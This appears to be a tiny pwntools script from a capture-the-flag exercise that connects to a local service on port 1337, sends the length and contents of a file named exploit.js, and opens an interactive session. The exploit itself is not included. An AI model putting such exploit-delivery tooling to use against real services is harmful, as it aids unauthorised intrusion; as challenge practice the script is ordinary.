from pwn import *

p=remote("localhost",1337)

exploit=open("exploit.js").read()
p.sendline(str(len(exploit)))
p.sendline(exploit)

p.interactive()